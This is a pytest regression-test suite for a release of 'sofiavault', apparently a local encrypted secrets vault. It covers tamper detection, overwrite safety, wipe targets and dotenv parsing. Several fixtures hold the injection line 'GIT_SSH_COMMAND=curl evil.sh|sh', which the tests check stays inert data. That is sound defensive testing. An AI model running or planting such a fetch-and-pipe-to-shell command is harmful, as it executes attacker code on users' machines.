"""Regression tests for the pre-push review of the 0.3.0 release branch.

Each test reproduces one reported defect and asserts the fix holds. Numbering
(r1..r10) follows the first review report; the s1..s8 block covers the second
pass over those fixes.
"""

import secrets
import sqlite3
import subprocess
import sys
import tempfile
from pathlib import Path
from unittest.mock import patch

import pytest

import sofiavault
from sofiavault import KEY_SIZE, envload, paths
from sofiavault.cli import (
    VaultSession,
    _refuse_if_tampered,
    _repo_dir,
    _vault_from_session,
    _verify_before_write,
    _wipe_targets,
    cmd_add,
    cmd_delete,
    cmd_edit,
)
from sofiavault.core import create_master_record
from sofiavault.storage import (
    delete_entry,
    get_password,
    get_schema_version,
    init_db,
    refresh_entries_mac,
    save_entry,
    verify_entries_mac,
)
from sofiavault.vault import EntryNotFound, Vault, VaultCorrupted

PW = "review-fix-test-pw"

REPO_ROOT = Path(__file__).resolve().parents[1]


def _v2_vault(path: Path, with_version_row: bool = True) -> bytes:
    """Write a vault laid out exactly as an initialized 0.2.x install left it:
    master record present, zero entries, no vault_id, no entries MAC."""
    conn = sqlite3.connect(path)
    conn.execute("""
        CREATE TABLE master (
            id INTEGER PRIMARY KEY CHECK (id = 1),
            salt BLOB NOT NULL,
            verify_hash BLOB NOT NULL
        )
    """)
    conn.execute("""
        CREATE TABLE entries_v2 (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            salt BLOB NOT NULL,
            nonce BLOB NOT NULL,
            blob BLOB NOT NULL
        )
    """)
    conn.execute("CREATE TABLE vault_meta (key TEXT PRIMARY KEY, value TEXT)")
    combined_salt, verify_hash, key = create_master_record(PW)
    conn.execute("INSERT INTO master (id, salt, verify_hash) VALUES (1, ?, ?)",
                 (combined_salt, verify_hash))
    if with_version_row:
        conn.execute(
            "INSERT INTO vault_meta (key, value) VALUES ('schema_version', '2')")
    conn.commit()
    conn.close()
    return key


def _tampered_vault() -> Path:
    """A v3 vault whose row set no longer matches its MAC (row deleted)."""
    path = Path(tempfile.mkdtemp()) / "secrets.db"
    v = Vault.create(path, PW)
    v.set("github", "old-token")
    v.set("stripe", "sk_live_x")
    v.close()
    raw = sqlite3.connect(path)
    raw.execute("DELETE FROM entries_v2 WHERE id = 1")
    raw.commit()
    raw.close()
    return path


# ── r1: entry-less 0.2.x vault must upgrade cleanly, not flag tampered ───────

def test_r1_empty_v2_vault_upgrades_without_false_tamper_alarm():
    path = Path(tempfile.mkdtemp()) / "vault.db"
    _v2_vault(path)

    v = Vault.open(path, password=PW)
    assert v.tampered is False
    with pytest.raises(EntryNotFound):
        v.get("anything")
    # fully adopted: current schema, MAC present and verifying
    assert get_schema_version(v._conn) >= 3
    assert verify_entries_mac(v._conn, v._key) is True
    v.set("github", "token")
    assert v.get("github") == "token"
    v.close()


def test_r1_empty_v2_vault_without_version_row_upgrades_too():
    # Ancient layout: initialized master but vault_meta has no version row.
    path = Path(tempfile.mkdtemp()) / "vault.db"
    _v2_vault(path, with_version_row=False)

    v = Vault.open(path, password=PW)
    assert v.tampered is False
    assert get_schema_version(v._conn) >= 3
    v.close()


def test_r1_brand_new_db_still_starts_at_current_schema():
    path = Path(tempfile.mkdtemp()) / "vault.db"
    conn = init_db(path)
    assert get_schema_version(conn) >= 3
    conn.close()


# ── r2: aborting an overwrite in `add` must not destroy the old entry ────────

def _session_with_entry() -> VaultSession:
    tmp = Path(tempfile.mkdtemp()) / "vault.db"
    key = secrets.token_bytes(KEY_SIZE)
    with patch("sofiavault.paths.DB_PATH", tmp):
        conn = init_db()
        save_entry(conn, key, "amazon", "user@test.com", "keep-me")
    return VaultSession(conn, key)


@pytest.mark.parametrize("inputs,password", [
    (["amazon", "y", ""], None),           # abort at empty username
    (["amazon", "y", "new@user.com"], ""),  # abort at empty password
])
def test_r2_aborted_overwrite_leaves_entry_intact(inputs, password):
    session = _session_with_entry()
    entry_id = session.entries[0].id

    with patch("builtins.input", side_effect=inputs), \
            patch("sofiavault.cli.getpass") as gp:
        gp.getpass.return_value = password
        cmd_add(session)

    session.reload()
    assert [e.service for e in session.entries] == ["amazon"]
    assert get_password(session.conn, session.key, entry_id) == "keep-me"


def test_r2_ctrl_c_at_password_prompt_leaves_entry_intact():
    session = _session_with_entry()
    entry_id = session.entries[0].id

    with patch("builtins.input", side_effect=["amazon", "y", "new@user.com"]), \
            patch("sofiavault.cli.getpass") as gp:
        gp.getpass.side_effect = KeyboardInterrupt
        with pytest.raises(KeyboardInterrupt):
            cmd_add(session)

    session.reload()
    assert get_password(session.conn, session.key, entry_id) == "keep-me"


def test_r2_confirmed_overwrite_still_replaces():
    session = _session_with_entry()
    entry_id = session.entries[0].id

    with patch("builtins.input", side_effect=["amazon", "y", "new@user.com"]), \
            patch("sofiavault.cli.getpass") as gp:
        gp.getpass.return_value = "replacement"
        cmd_add(session)

    session.reload()
    assert [e.service for e in session.entries] == ["amazon"]
    assert get_password(session.conn, session.key, entry_id) == "replacement"
    assert session.entries[0].username == "new@user.com"


# ── r3: writes must not launder a detected tampering into a valid MAC ────────

def test_r3_set_refuses_on_tampered_vault():
    path = _tampered_vault()
    v = Vault.open(path, password=PW)
    assert v.tampered is True
    with pytest.raises(VaultCorrupted):
        v.set("unrelated-token", "value")
    # evidence intact: still failing, nothing was re-signed
    assert verify_entries_mac(v._conn, v._key) is False
    v.close()


def test_r3_delete_refuses_on_tampered_vault():
    path = _tampered_vault()
    v = Vault.open(path, password=PW)
    with pytest.raises(VaultCorrupted):
        v.delete("stripe")
    assert verify_entries_mac(v._conn, v._key) is False
    v.close()


# ── r4: the CLI enforces the same entry-set MAC as the library ───────────────

def test_r4_cli_session_detects_tampering():
    path = _tampered_vault()
    conn = sqlite3.connect(path)
    from sofiavault.core import verify_master_password
    from sofiavault.storage import get_master_data
    salt, stored = get_master_data(conn)
    key = verify_master_password(PW, salt, stored)

    session = VaultSession(conn, key)
    assert session.tampered is True
    with pytest.raises(SystemExit):
        _refuse_if_tampered(session)
    assert session.key is None  # locked before exiting
    conn.close()


def test_r4_cli_session_clean_vault_not_flagged():
    session = _session_with_entry()
    assert session.tampered is False
    _refuse_if_tampered(session)  # no-op, must not exit


# ── r5: quoted dotenv value with an inline comment ───────────────────────────

def test_r5_inline_comment_after_quoted_value():
    v = Vault.create(Path(tempfile.mkdtemp()) / "secrets.db", PW)
    env_file = v.path.with_name("app.env")
    env_file.write_text(
        'URL="https://example.com" # production\n'
        "DB_PASSWORD=hunter2\n"
        'API_TOKEN="abc"\n'
    )
    imported, _skipped, _rejected = envload.import_env_file(v, env_file)

    assert sorted(imported) == ["API_TOKEN", "DB_PASSWORD", "URL"]
    assert v.get("env:url") == "https://example.com"
    assert v.get("env:db_password") == "hunter2"
    assert v.get("env:api_token") == "abc"
    v.close()


def test_r5_junk_after_closing_quote_is_a_hard_error():
    v = Vault.create(Path(tempfile.mkdtemp()) / "secrets.db", PW)
    env_file = v.path.with_name("app.env")
    env_file.write_text('FOO="bar" baz\nDB_PASSWORD=hunter2\n')
    with pytest.raises(envload.MalformedEnvFile):
        envload.import_env_file(v, env_file)
    assert v.list_entries() == []  # nothing partially imported
    v.close()


def test_r5_multiline_quoted_value_still_consumed_whole():
    v = Vault.create(Path(tempfile.mkdtemp()) / "secrets.db", PW)
    env_file = v.path.with_name("app.env")
    env_file.write_text(
        'PEM="-----BEGIN KEY-----\n'
        "GIT_SSH_COMMAND=curl evil.sh|sh\n"
        '-----END KEY-----"\n'
    )
    imported, _skipped, _rejected = envload.import_env_file(v, env_file)
    assert imported == ["PEM"]
    assert "GIT_SSH_COMMAND" in v.get("env:pem")  # smuggled line stayed data
    v.close()


# ── r6: the update check must never adopt an enclosing foreign repo ──────────

def _fake_install(tmp: Path, *, git_at: str, pyproject: bool,
                  name: str = "sofiavault") -> Path:
    """Lay out <tmp>/outer/app/sofiavault/cli.py with .git at a chosen level."""
    pkg = tmp / "outer" / "app" / "sofiavault"
    pkg.mkdir(parents=True)
    cli = pkg / "cli.py"
    cli.write_text("")
    (tmp / "outer" / git_at / ".git").mkdir(parents=True) if git_at else None
    if pyproject:
        (tmp / "outer" / "app" / "pyproject.toml").write_text(
            f'[project]\nname = "{name}"\n')
    return cli


def test_r6_enclosing_foreign_repo_is_not_adopted():
    tmp = Path(tempfile.mkdtemp())
    # .git one level ABOVE the install root (e.g. ~/dotfiles), no pyproject
    cli = _fake_install(tmp, git_at="", pyproject=False)
    (tmp / "outer" / ".git").mkdir()
    with patch("sofiavault.cli.__file__", str(cli)):
        assert _repo_dir() is None


def test_r6_repo_root_without_sofiavault_pyproject_is_not_adopted():
    tmp = Path(tempfile.mkdtemp())
    cli = _fake_install(tmp, git_at="app", pyproject=True, name="dotfiles")
    with patch("sofiavault.cli.__file__", str(cli)):
        assert _repo_dir() is None


def test_r6_genuine_clone_is_still_detected():
    tmp = Path(tempfile.mkdtemp())
    cli = _fake_install(tmp, git_at="app", pyproject=True)
    with patch("sofiavault.cli.__file__", str(cli)):
        assert _repo_dir() == (tmp / "outer" / "app").resolve()


def test_r6_this_checkout_is_detected():
    # The repo these tests run in is a genuine clone.
    assert _repo_dir() == REPO_ROOT


# ── r7: sofiavault.DB_PATH must never be a silently ineffective override ─────

def test_r7_module_paths_still_readable():
    assert sofiavault.DB_PATH == paths.DB_PATH
    assert sofiavault.HISTORY_PATH == paths.HISTORY_PATH


@pytest.mark.parametrize("name", ["DB_PATH", "HISTORY_PATH"])
def test_r7_assignment_refuses_loudly_instead_of_silently_missing(name):
    # A 0.2.x script assigning here would otherwise keep operating on the
    # real ~/.sofiavault vault. Refuse, and say where to assign instead.
    before = getattr(paths, name)
    with pytest.raises(AttributeError) as exc:
        setattr(sofiavault, name, Path(tempfile.mkdtemp()) / "x.db")
    assert f"sofiavault.paths.{name}" in str(exc.value)
    assert getattr(paths, name) == before


@pytest.mark.parametrize("name", ["DB_PATH", "HISTORY_PATH"])
def test_r7_mock_patch_on_the_old_name_fails_fast(name):
    before = getattr(paths, name)
    with pytest.raises(AttributeError):  # noqa: SIM117
        with patch(f"sofiavault.{name}", Path(tempfile.mkdtemp()) / "x.db"):
            pass
    assert getattr(paths, name) == before


def test_r7_patching_the_paths_module_sandboxes_the_cli():
    # The supported idiom, and the one the whole suite uses.
    target = Path(tempfile.mkdtemp()) / "vault.db"
    with patch("sofiavault.paths.DB_PATH", target):
        conn = init_db()
        conn.close()
        assert target.exists()
    assert target != paths.DB_PATH  # cleanly restored


# ── r8: wipe must destroy the auth store alongside the vault ─────────────────

def test_r8_wipe_targets_include_auth_store():
    tmp = Path(tempfile.mkdtemp())
    with patch("sofiavault.paths.DB_PATH", tmp / "vault.db"), \
            patch("sofiavault.paths.HISTORY_PATH", tmp / ".history"):
        targets = _wipe_targets()
    assert tmp / "users.db" in targets
    assert tmp / "users.db-wal" in targets
    assert tmp / "users.db-journal" in targets
    # and every target stays inside the (patched) vault directory
    assert all(t.parent == tmp for t in targets)


# ── r9: importing the package must survive sys.stdout being None ─────────────

def test_r9_import_survives_detached_stdout():
    res = subprocess.run(
        [sys.executable, "-c",
         "import sys; sys.stdout = None; import sofiavault; "
         "sys.stderr.write(sofiavault.__version__)"],
        capture_output=True, text=True, cwd=REPO_ROOT, timeout=60,
    )
    assert res.returncode == 0, res.stderr
    assert res.stderr == sofiavault.__version__


# ── r10: the delete_entry break is deliberate and documented ─────────────────

def test_r10_docstring_and_changelog_declare_the_break():
    assert "delete_entry" in sofiavault.__doc__
    changelog = (REPO_ROOT / "CHANGELOG.md").read_text(encoding="utf-8")
    assert "Breaking" in changelog
    assert "delete_entry(conn, entry_id, key)" in changelog


# ═════════════════════════════════════════════════════════════════════════════
# Second review pass: defects found in the fixes above.
# ═════════════════════════════════════════════════════════════════════════════


def _tamper_rows_behind(conn: sqlite3.Connection):
    """Rewrite the row set out from under a live session/vault."""
    raw = sqlite3.connect(conn.execute("PRAGMA database_list").fetchone()[2])
    raw.execute("DELETE FROM entries_v2 WHERE id = (SELECT MIN(id) FROM entries_v2)")
    raw.commit()
    raw.close()


# ── s1: no second home for the vault path to go stale in ─────────────────────

def test_s1_sandbox_installed_via_paths_survives_a_nested_patch_attempt():
    # The failure this guards: a nested patch of the old name restoring an
    # import-time path over a live sandbox, with cmd_wipe downstream.
    sandbox = Path(tempfile.mkdtemp()) / "outer.db"
    with patch("sofiavault.paths.DB_PATH", sandbox):
        with pytest.raises(AttributeError):  # noqa: SIM117
            with patch("sofiavault.DB_PATH", Path(tempfile.mkdtemp()) / "in.db"):
                pass
        assert sandbox == paths.DB_PATH  # sandbox intact


def test_s1_module_has_no_shadowing_dict_entry():
    # A __dict__ copy is what could go stale; there must not be one.
    assert "DB_PATH" not in sys.modules["sofiavault"].__dict__
    assert "HISTORY_PATH" not in sys.modules["sofiavault"].__dict__


# ── s2: writes re-verify the MAC against the file, not a cached flag ─────────

def test_s2_library_set_detects_tampering_after_unlock():
    path = Path(tempfile.mkdtemp()) / "secrets.db"
    v = Vault.create(path, PW)
    v.set("github", "tok")
    v.set("stripe", "sk")
    assert v.tampered is False  # clean at unlock

    _tamper_rows_behind(v._conn)

    with pytest.raises(VaultCorrupted):
        v.set("unrelated", "value")
    assert verify_entries_mac(v._conn, v._key) is False
    v.close()


def test_s2_library_delete_detects_tampering_after_unlock():
    path = Path(tempfile.mkdtemp()) / "secrets.db"
    v = Vault.create(path, PW)
    v.set("github", "tok")
    v.set("stripe", "sk")
    _tamper_rows_behind(v._conn)

    with pytest.raises(VaultCorrupted):
        v.delete("stripe")
    v.close()


def test_s2_cli_add_detects_tampering_after_unlock():
    session = _session_with_entry()
    save_entry(session.conn, session.key, "github", "u", "p")
    session.reload()
    assert session.tampered is False

    _tamper_rows_behind(session.conn)

    with patch("builtins.input", side_effect=["newsite", "user@x.com"]), \
            patch("sofiavault.cli.getpass") as gp:
        gp.getpass.return_value = "secret"
        with pytest.raises(SystemExit):
            cmd_add(session)
    # nothing re-signed: the evidence survives
    conn = sqlite3.connect(session.conn.execute(
        "PRAGMA database_list").fetchone()[2])
    assert conn.execute(
        "SELECT COUNT(*) FROM entries_v2").fetchone()[0] == 1
    conn.close()


def test_s2_cli_delete_detects_tampering_after_unlock():
    session = _session_with_entry()
    save_entry(session.conn, session.key, "github", "u", "p")
    session.reload()
    _tamper_rows_behind(session.conn)

    with patch("builtins.input", side_effect=["y"]), pytest.raises(SystemExit):
        cmd_delete(session, "github")


def test_s2_verify_before_write_passes_on_clean_vault():
    session = _session_with_entry()
    _verify_before_write(session)  # must not raise or exit
    assert session.tampered is False


# ── s3: wipe stays reachable on a tampered vault ─────────────────────────────

def test_s3_wipe_is_exempt_from_the_tamper_gate():
    src = (REPO_ROOT / "sofiavault" / "cli.py").read_text(encoding="utf-8")
    assert "if command != 'wipe':" in src
    # and the guidance points at wipe rather than manual deletion
    assert "sofiavault wipe" in src


def test_s3_tamper_message_offers_wipe():
    session = _session_with_entry()
    session.tampered = True
    with pytest.raises(SystemExit):
        _refuse_if_tampered(session)


# ── s4: concurrent first-time init_db must not crash ─────────────────────────

def test_s4_concurrent_brand_new_init_does_not_raise():
    path = Path(tempfile.mkdtemp()) / "vault.db"
    a = init_db(path)
    b = init_db(path)  # second process racing on the same fresh file
    assert get_schema_version(a) >= 3
    assert get_schema_version(b) >= 3
    a.close()
    b.close()


def test_s4_second_open_never_downgrades_recorded_version():
    path = Path(tempfile.mkdtemp()) / "vault.db"
    v = Vault.create(path, PW)
    v.set("a", "b")
    v.close()
    conn = init_db(path)
    assert get_schema_version(conn) >= 3
    conn.close()


# ── s5/s7: dotenv quoting — comments, escapes, and multi-line closes ─────────

def _import_pairs(text: str) -> dict:
    return dict(envload._iter_env_pairs(text))


def test_s5_multiline_close_with_inline_comment_does_not_swallow():
    pairs = _import_pairs(
        'PEM="first\n'
        'second"  # note\n'
        "DB_PASSWORD=hunter2\n"
        'C="x"\n'
    )
    assert pairs["PEM"] == "first\nsecond"
    assert pairs["DB_PASSWORD"] == "hunter2"
    assert pairs["C"] == "x"


def test_s5_multiline_close_with_junk_aborts_the_whole_import():
    # Absorbed rather than re-parsed (a re-parse would make the following
    # line its own injected variable), and the None aborts the import, so
    # nothing lands in the vault under a name the file never assigned.
    pairs = _import_pairs('PEM="first\nsecond" junk\nDB_PASSWORD=hunter2\n')
    assert pairs["PEM"] is None
    assert "DB_PASSWORD" not in pairs


def test_s5_junk_close_rejects_the_file_end_to_end():
    v = Vault.create(Path(tempfile.mkdtemp()) / "secrets.db", PW)
    env_file = v.path.with_name("app.env")
    env_file.write_text('PEM="first\nsecond" junk\nDB_PASSWORD=hunter2\n')
    with pytest.raises(envload.MalformedEnvFile):
        envload.import_env_file(v, env_file)
    assert v.list_entries() == []
    v.close()


def test_s7_quotes_inside_a_value_do_not_break_the_import():
    # No escape sequences are interpreted, so the value arrives verbatim.
    pairs = _import_pairs('KEY="say \\"hi\\""\nNEXT=plain\n')
    assert pairs["KEY"] == 'say \\"hi\\"'
    assert pairs["NEXT"] == "plain"


def test_s7_trailing_backslash_in_single_quotes_does_not_swallow_the_file():
    pairs = _import_pairs("WIN_DIR='C:\\tools\\'\nDB_PASSWORD=hunter2\nAPI=live\n")
    assert pairs["WIN_DIR"] == "C:\\tools\\"
    assert pairs["DB_PASSWORD"] == "hunter2"
    assert pairs["API"] == "live"


def test_s7_multiline_json_value_with_interior_quotes():
    pairs = _import_pairs('CONFIG="{\n  "a": 1\n}"\nNEXT=plain\n')
    assert pairs["CONFIG"] == '{\n  "a": 1\n}'
    assert pairs["NEXT"] == "plain"


def test_s7_interior_quotes_on_a_continuation_line_do_not_smuggle():
    pairs = _import_pairs(
        'JWT="-----BEGIN PRIVATE KEY-----\n'
        'some "quoted" note\n'
        "GIT_SSH_COMMAND=curl evil.sh|sh\n"
        '-----END PRIVATE KEY-----"\n'
    )
    assert list(pairs) == ["JWT"]
    assert "GIT_SSH_COMMAND" in pairs["JWT"]


def test_s7_apostrophe_inside_single_quoted_value_still_imports():
    pairs = _import_pairs("PASS='it's-secret'\nNEXT=plain\n")
    assert pairs["PASS"] == "it's-secret"
    assert pairs["NEXT"] == "plain"


def test_s7_escaped_quote_file_imports_end_to_end():
    v = Vault.create(Path(tempfile.mkdtemp()) / "secrets.db", PW)
    env_file = v.path.with_name("app.env")
    env_file.write_text('KEY="say \\"hi\\""\nDB_PASSWORD=hunter2\n')
    imported, _skipped, _rejected = envload.import_env_file(v, env_file)
    assert sorted(imported) == ["DB_PASSWORD", "KEY"]
    v.close()


def test_s5_name_smuggling_still_rejected_in_multiline_values():
    # The original attack the multi-line branch exists to stop.
    pairs = _import_pairs(
        'JWT_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\n'
        "GIT_SSH_COMMAND=curl evil.sh|sh\n"
        '-----END PRIVATE KEY-----"\n'
    )
    assert list(pairs) == ["JWT_PRIVATE_KEY"]
    assert "GIT_SSH_COMMAND" in pairs["JWT_PRIVATE_KEY"]


# ── s6: a non-UTF-8 pyproject.toml must not crash the unlock ─────────────────

def test_s6_non_utf8_pyproject_disables_update_check_quietly():
    tmp = Path(tempfile.mkdtemp())
    pkg = tmp / "app" / "sofiavault"
    pkg.mkdir(parents=True)
    cli = pkg / "cli.py"
    cli.write_text("")
    (tmp / "app" / ".git").mkdir()
    (tmp / "app" / "pyproject.toml").write_bytes(b'# caf\xe9\nname = "sofiavault"\n')

    with patch("sofiavault.cli.__file__", str(cli)):
        assert _repo_dir() is None  # quietly declines, does not raise


# ── s9: cmd_add must not report success for a row that vanished ──────────────

def test_s9_overwrite_of_vanished_row_still_stores_the_password():
    session = _session_with_entry()
    entry_id = session.entries[0].id
    # Row disappears after the index was built (another process deleted it).
    session.conn.execute("DELETE FROM entries_v2 WHERE id = ?", (entry_id,))
    refresh_entries_mac(session.conn, session.key)

    with patch("builtins.input", side_effect=["amazon", "y", "user@x.com"]), \
            patch("sofiavault.cli.getpass") as gp:
        gp.getpass.return_value = "stored-anyway"
        cmd_add(session)

    session.reload()
    entry = [e for e in session.entries if e.service == "amazon"]
    assert entry, "reported Saved but stored nothing"
    assert get_password(session.conn, session.key, entry[0].id) == "stored-anyway"


# ── s10: wipe covers every SQLite sidecar it claims to ───────────────────────

def test_t1_tamper_flag_latches_in_the_library():
    path = Path(tempfile.mkdtemp()) / "secrets.db"
    v = Vault.create(path, PW)
    v.set("github", "tok")
    v.set("stripe", "sk")

    # Attacker edits the rows, then a writer holding the key re-signs the
    # set — the MAC verifies again, but the edit still happened.
    _tamper_rows_behind(v._conn)
    with pytest.raises(VaultCorrupted):
        v.set("x", "y")
    refresh_entries_mac(v._conn, v._key)
    assert verify_entries_mac(v._conn, v._key) is True

    # The flag must not be cleared by that re-signing.
    assert v.tampered is True
    with pytest.raises(VaultCorrupted):
        v.set("x", "y")
    with pytest.raises(VaultCorrupted):
        v.get("github")
    v.close()


def test_t1_tamper_flag_latches_in_the_cli_session():
    session = _session_with_entry()
    save_entry(session.conn, session.key, "github", "u", "p")
    session.reload()
    _tamper_rows_behind(session.conn)
    session.reload()
    assert session.tampered is True

    refresh_entries_mac(session.conn, session.key)
    session.reload()
    assert session.tampered is True, "a later valid MAC must not clear it"


# ── t2: writes must not silently lose a secret when the row is gone ──────────

def test_t2_library_set_stores_the_secret_when_the_row_vanished():
    path = Path(tempfile.mkdtemp()) / "secrets.db"
    a = Vault.create(path, PW)
    a.set("github", "tok1")
    key = a.export_key()

    b = Vault.open(path, key=__import__("base64").b64decode(key))
    b.delete("github")          # legitimate delete, re-signs the MAC
    b.close()

    a.set("github", "tok2")     # a's index still lists the vanished row
    a.close()

    c = Vault.open(path, password=PW)
    assert c.get("github") == "tok2"
    c.close()


def test_t2_library_set_refuses_to_overwrite_an_unreadable_row():
    path = Path(tempfile.mkdtemp()) / "secrets.db"
    v = Vault.create(path, PW)
    v.set("github", "tok")
    entry_id = v.list_entries()[0].id
    # Blob turns unreadable after the index was built, and the set is
    # re-signed so only decryption fails. No _reload: the in-memory index
    # still lists the entry, which is exactly the race this guards.
    v._conn.execute("UPDATE entries_v2 SET blob = ? WHERE id = ?",
                    (b"\x00" * 40, entry_id))
    refresh_entries_mac(v._conn, v._key)

    with pytest.raises(VaultCorrupted):
        v.set("github", "replacement")
    v.close()


def test_t2_cli_add_refuses_to_overwrite_an_unreadable_row(capsys):
    session = _session_with_entry()
    entry_id = session.entries[0].id
    session.conn.execute("UPDATE entries_v2 SET blob = ? WHERE id = ?",
                         (b"\x00" * 40, entry_id))
    refresh_entries_mac(session.conn, session.key)

    with patch("builtins.input", side_effect=["amazon", "y", "user@x.com"]), \
            patch("sofiavault.cli.getpass") as gp:
        gp.getpass.return_value = "replacement"
        cmd_add(session)

    out = capsys.readouterr().out
    assert "could not be decrypted" in out
    # the unreadable row is still there — not destroyed by the attempt
    assert session.conn.execute(
        "SELECT COUNT(*) FROM entries_v2").fetchone()[0] == 1


# ── t3: a partial env import must not be reported as "nothing imported" ──────

def test_t3_partial_env_import_message_is_accurate():
    # 0.4.0: `env import` moved to cli_server.py (review finding F21)
    src = (REPO_ROOT / "sofiavault" / "cli_server.py").read_text(encoding="utf-8")
    assert "The import stopped partway" in src
    assert "Nothing was imported." in src  # still used for the parse-time abort


# ── u1: quoting — what works, and the two ambiguities that cannot ────────────

@pytest.mark.parametrize("line,expected", [
    ('URL="https://x.io" # prod', "https://x.io"),                  # r5
    ('TITLE="The "Big" # 1 Album"', 'The "Big" # 1 Album'),         # quote before #
    ("PASS='it's-secret'", "it's-secret"),                          # interior quote
    ("WIN_DIR='C:\\tools\\'", "C:\\tools\\"),               # trailing backslash
    ('K="say \\"hi\\""', 'say \\"hi\\"'),                   # no unescaping
])
def test_u1_single_line_quoting(line, expected):
    pairs = _import_pairs(line + "\nNEXT=plain\n")
    assert list(pairs.values())[0] == expected
    assert pairs["NEXT"] == "plain"


@pytest.mark.parametrize("text,expected", [
    ('PEM="a\nb"  # note\n', "a\nb"),                              # s5
    ("NOTE='it's a multi-line\nnote'\n", "it's a multi-line\nnote"),
    ('CERT="-----BEGIN "X509" CERT-----\nabc\n-----END CERT-----"\n',
     '-----BEGIN "X509" CERT-----\nabc\n-----END CERT-----'),
    ('CFG="{\n  "a": 1\n}"\n', '{\n  "a": 1\n}'),
])
def test_u1_multiline_quoting(text, expected):
    pairs = _import_pairs(text + "NEXT=plain\n")
    assert list(pairs.values())[0] == expected
    assert pairs["NEXT"] == "plain"


def test_u1_name_smuggling_stays_data():
    pairs = _import_pairs(
        'PEM="-----BEGIN\nGIT_SSH_COMMAND=curl evil|sh\n-----END"\nNEXT=p\n')
    assert list(pairs) == ["PEM", "NEXT"]
    assert "GIT_SSH_COMMAND" in pairs["PEM"]


# The two ambiguities the format cannot resolve. Pinned deliberately: both
# are documented in _iter_env_pairs and SECURITY.md, and any change to
# them should be a conscious one, not a silent drift.

def test_u1_known_limit_comment_after_a_line_ending_in_quote_is_kept():
    # Indistinguishable from a value that legitimately ends in a quote
    # (TITLE above), so the comment is kept rather than guessed away.
    pairs = _import_pairs('PW="hunter2" # rotate with the "primary"\n')
    assert pairs["PW"] == 'hunter2" # rotate with the "primary'


def test_u1_known_limit_junk_after_close_reads_as_multiline():
    # Same shape as the opening line of a legitimate multi-line value
    # (NOTE above), so it consumes rather than inventing a variable name.
    pairs = _import_pairs('FOO="bar" baz\nDB_PASSWORD=hunter2\n')
    assert "DB_PASSWORD" not in pairs
    assert pairs["FOO"] is None          # unterminated -> import aborts


def test_u1_known_limit_aborts_the_import_rather_than_importing_wrongly():
    v = Vault.create(Path(tempfile.mkdtemp()) / "secrets.db", PW)
    env_file = v.path.with_name("app.env")
    env_file.write_text('FOO="bar" baz\nDB_PASSWORD=hunter2\n')
    with pytest.raises(envload.MalformedEnvFile):
        envload.import_env_file(v, env_file)
    assert v.list_entries() == []
    v.close()


# ── u2: cmd_edit needs the vanished-row check too ────────────────────────────

def test_u2_edit_reports_failure_when_the_row_vanished(capsys):
    session = _session_with_entry()
    entry_id = session.entries[0].id

    def _delete_then_answer(_prompt=""):
        # Another writer removes the row (re-signing the MAC) mid-prompt.
        session.conn.execute("DELETE FROM entries_v2 WHERE id = ?", (entry_id,))
        refresh_entries_mac(session.conn, session.key)
        return ""

    with patch("builtins.input", side_effect=_delete_then_answer), \
            patch("sofiavault.cli.getpass") as gp:
        gp.getpass.return_value = "newpass"
        cmd_edit(session, "amazon")

    out = capsys.readouterr().out
    assert "Updated" not in out
    assert "was removed from the vault" in out


# ── u3: cmd_add must leave a usable way out for an unreadable entry ──────────

def test_u3_add_refuses_to_overwrite_an_unreadable_entry(capsys):
    session = _session_with_entry()
    entry_id = session.entries[0].id
    session.conn.execute("UPDATE entries_v2 SET blob = ? WHERE id = ?",
                         (b"\x00" * 40, entry_id))
    refresh_entries_mac(session.conn, session.key)

    with patch("builtins.input", side_effect=["amazon", "y", "user@x.com"]), \
            patch("sofiavault.cli.getpass") as gp:
        gp.getpass.return_value = "recovered"
        cmd_add(session)

    out = capsys.readouterr().out
    assert "could not be decrypted" in out
    assert "was not overwritten" in out
    assert "delete amazon" in out          # a route the CLI can actually run
    # ciphertext untouched: one row, unchanged, nothing re-encrypted
    row = session.conn.execute(
        "SELECT id, blob FROM entries_v2").fetchall()
    assert len(row) == 1
    assert row[0][0] == entry_id
    assert row[0][1] == b"\x00" * 40


# ── u4: the library wrapper must inherit the session's latched flag ──────────

def test_u4_vault_wrapper_inherits_latched_tamper_flag():
    session = _session_with_entry()
    session.tampered = True
    assert _vault_from_session(session).tampered is True


def test_u4_vault_wrapper_sees_writes_made_through_the_session():
    session = _session_with_entry()
    assert [e.service for e in _vault_from_session(session).list_entries()] \
        == ["amazon"]
    # A CLI-side write goes through storage, not the wrapper.
    delete_entry(session.conn, session.entries[0].id, session.key)
    session.reload()
    assert _vault_from_session(session).list_entries() == []


def test_s10_wipe_targets_include_shm_sidecars():
    tmp = Path(tempfile.mkdtemp())
    with patch("sofiavault.paths.DB_PATH", tmp / "vault.db"), \
            patch("sofiavault.paths.HISTORY_PATH", tmp / ".history"):
        targets = _wipe_targets()
    for db in ("vault.db", "users.db"):
        for suffix in ("-wal", "-shm", "-journal"):
            assert tmp / f"{db}{suffix}" in targets
